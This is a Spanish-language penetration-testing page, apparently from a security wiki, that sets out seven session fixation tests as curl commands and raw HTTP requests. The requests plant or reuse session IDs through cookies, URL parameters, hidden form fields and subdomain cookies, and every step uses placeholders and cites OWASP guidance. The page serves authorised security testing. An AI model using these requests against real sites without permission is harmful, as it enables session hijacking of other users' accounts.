# 🗡️ Fijación de sesión: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Rotación al iniciar sesión

**Objetivo:** Capturar la cookie anónima y autenticar esa misma sesión propia.

```bash
curl -i -c anon.cookies "https://{ORIGEN}/login"
curl -i -b anon.cookies -c login.cookies -X POST \
  --data-urlencode "username={EMAIL_PROPIO}" \
  --data-urlencode "password={PASSWORD_PROPIA}" \
  "https://{ORIGEN}/login"
```

**Interpretación:** Comparar valores de sesión; si no rotan, todavía falta demostrar que otro navegador puede recibir el ID previo.

**Fuente técnica:** [documentación de la técnica](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/06-Session_Management/03-Session_Fixation/).

### 2. ID anónimo tras login

**Objetivo:** Usar el ID anterior desde una segunda sesión de prueba después del login de A.

```http
GET /api/me HTTP/1.1
Host: {ORIGEN}
Cookie: session={ID_ANONIMO_ANTES_DEL_LOGIN}
```

**Interpretación:** Una respuesta con identidad de A confirma que el ID preconocido se elevó; usar cuentas propias.

**Fuente técnica:** [documentación de la técnica](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/06-Session_Management/03-Session_Fixation/).

### 3. Adopción de ID aportado

**Objetivo:** Enviar un ID sintácticamente válido elegido por el tester antes de autenticarse.

```http
GET /login HTTP/1.1
Host: {ORIGEN}
Cookie: session={ID_ELEGIDO_DE_PRUEBA}
```

**Interpretación:** El servidor debería emitir un ID nuevo. Si conserva el elegido, comprobar su validez después de login.

**Fuente técnica:** [documentación de la técnica](https://community.owasp.org/attacks/Session_fixation).

### 4. Session ID en URL

**Objetivo:** Probar si un token de sesión propio en la URL se adopta al autenticarse.

```http
GET /login?sessionid={ID_ANONIMO_PROPIO} HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Solo aplica si la aplicación usa IDs en URL. Verificar que el valor persiste y autoriza después de login.

**Fuente técnica:** [documentación de la técnica](https://community.owasp.org/attacks/Session_fixation).

### 5. Campo oculto de sesión

**Objetivo:** Modificar un hidden field de sesión únicamente si el formulario real lo contiene.

```http
POST /login HTTP/1.1
Host: {ORIGEN}
Content-Type: application/x-www-form-urlencoded

username={EMAIL_PROPIO}&password={PASSWORD_PROPIA}&sessionid={ID_ANONIMO_PROPIO}
```

**Interpretación:** No agregar campos inventados a una app que no los usa. Confirmar en Set-Cookie e identidad efectiva.

**Fuente técnica:** [documentación de la técnica](https://community.owasp.org/attacks/Session_fixation).

### 6. Cookie de subdominio

**Objetivo:** Comparar si una cookie Domain amplia de un subdominio propio domina la sesión del host principal.

```http
GET /login HTTP/1.1
Host: {HOST_PRINCIPAL}
Cookie: session={ID_EMITIDO_EN_SUBDOMINIO_PROPIO}
```

**Interpretación:** Se necesita control autorizado del subdominio y cookie Domain compatible; no basta que el navegador envíe dos cookies.

**Fuente técnica:** [documentación de la técnica](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/06-Session_Management/03-Session_Fixation/).

### 7. Rotación en elevación

**Objetivo:** Tras entrar como usuario bajo, ejecutar un paso de elevación propio y comparar IDs.

```http
GET /api/security/settings HTTP/1.1
Host: {ORIGEN}
Cookie: session={ID_ANTES_DE_ELEVAR}
```

**Interpretación:** Si una autenticación adicional otorga privilegio, el ID anterior no debería adquirirlos si el diseño exige rotación.

**Fuente técnica:** [documentación de la técnica](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/06-Session_Management/03-Session_Fixation/).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
